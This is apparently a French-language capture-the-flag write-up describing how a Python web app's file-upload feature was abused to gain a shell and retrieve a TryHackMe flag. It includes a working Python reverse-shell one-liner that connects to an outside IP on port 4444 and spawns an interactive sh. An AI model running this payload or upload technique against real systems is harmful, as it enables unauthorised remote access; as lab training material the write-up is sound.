# Target : http://10.129.177.221:5000

![[Pasted image 20260818202744.png]]

En interceptant la requete avec Burp nous pouvons voir que le serveur c'est du python

![[Pasted image 20260818203013.png]]

J'ai lancer les tout type d'injection dans la partie Chat mais rien de ce que nous ecrivons ne vas au serveur alors je me suis concentrer sur le `File Upload` 
Apres avoir charger un ficher nous pouvons voir le `PATH` de ce dernier dans le code source de la page

![[Pasted image 20260818203256.png]]

J'ai tenter de charger un payload python pour voir la reaction du serveur et bim j'ai eu un shell

```js
import os,pty,socket;s=socket.socket();s.connect(("192.168.129.94",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
```

![[Pasted image 20260818203633.png]]

# Flag : THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}


